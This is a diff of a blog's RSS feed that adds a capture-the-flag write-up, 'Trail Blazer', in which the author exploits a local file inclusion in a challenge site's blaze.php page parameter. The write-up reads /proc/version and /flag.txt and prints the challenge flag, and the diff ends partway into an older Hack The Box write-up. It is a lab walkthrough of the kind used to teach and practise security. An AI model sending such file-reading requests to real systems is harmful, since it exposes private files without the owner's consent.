@@ -1,4 +1,60 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>LFI - Tag - Pascal's Blog</title><link>https://blog.ppeinecke.de/tags/lfi/</link><description>LFI - Tag - Pascal's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 13 Sep 2022 19:31:57 +0200</lastBuildDate><atom:link href="https://blog.ppeinecke.de/tags/lfi/" rel="self" type="application/rss+xml"/><item><title>HTB - Starting Point - Responder</title><link>https://blog.ppeinecke.de/posts/htb-starting-point-responder/</link><pubDate>Tue, 13 Sep 2022 19:31:57 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/htb-starting-point-responder/</guid><description><![CDATA[<div class="featured-image">
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>LFI - Tag - Pascal's Blog</title><link>https://blog.ppeinecke.de/tags/lfi/</link><description>LFI - Tag - Pascal's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 04 Dec 2022 23:39:42 +0100</lastBuildDate><atom:link href="https://blog.ppeinecke.de/tags/lfi/" rel="self" type="application/rss+xml"/><item><title>Technovate2022 - Forensics - Trail Blazer</title><link>https://blog.ppeinecke.de/posts/technovate2022-forensics-trail-blazer/</link><pubDate>Sun, 04 Dec 2022 23:39:42 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/technovate2022-forensics-trail-blazer/</guid><description><![CDATA[<div class="featured-image">
+                <img src="/featuredImages/technovate2022.jpg" referrerpolicy="no-referrer">
+            </div><h1 id="trail-blazer">Trail Blazer</h1>
+<h2 id="description">description</h2>
+<p>I just made <a href="http://host3.metaproblems.com:4110/" target="_blank" rel="noopener noreffer">this cool website</a> that acts as your own personal web browser!</p>
+<p>Why is this cool? Well&hellip; I wrote it! Anyway, check it out and let me know if there are any
+features you would like to see added!</p>
+<p><strong>Hint: You just need to search for /flag.txt.</strong></p>
+<h2 id="writeup">writeup</h2>
+<p>upon opening the website in my browser i am presented with the following form:</p>
+<p></p>
+<p>If i try to input any url e.g. <a href="http://google.com" target="_blank" rel="noopener noreffer">google.com</a> I get redirected to this page: <a href="http://host3.metaproblems.com:4110/blaze.php?page=google.com" target="_blank" rel="noopener noreffer"><code>http://host3.metaproblems.com:4110/blaze.php?page=google.com</code></a></p>
+<p>But I get an error:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">Could not open file.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So it looks like the program is including an actual single file.</p>
+<p>Let’s try something like: <code>/proc/version</code></p>
+<p>The GET request would look like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">http://host3.metaproblems.com:4110/blaze.php?page=/proc/version
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And I get the following response:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">Linux version 4.19.0-22-cloud-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.260-1 (2022-09-29)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So that confirms that the LFI technique is in fact working.</p>
+<p>Since the hint for this challenge says: <strong>You just need to search for /flag.txt</strong></p>
+<p>We can just get the flag like so:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://host3.metaproblems.com:4110/blaze.php?page<span class="o">=</span>/flag.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MetaCTF<span class="o">{</span>blazing_paths_will_blaze_your_app_t00<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>]]></description></item><item><title>HTB - Starting Point - Responder</title><link>https://blog.ppeinecke.de/posts/htb-starting-point-responder/</link><pubDate>Tue, 13 Sep 2022 19:31:57 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/htb-starting-point-responder/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/featuredImages/responder.jpeg" referrerpolicy="no-referrer">
             </div><h1 id="htb---starting-point-responder---writeup">HTB - Starting Point: Responder - writeup:</h1>
 <h2 id="target-ip-address">Target IP Address:</h2>
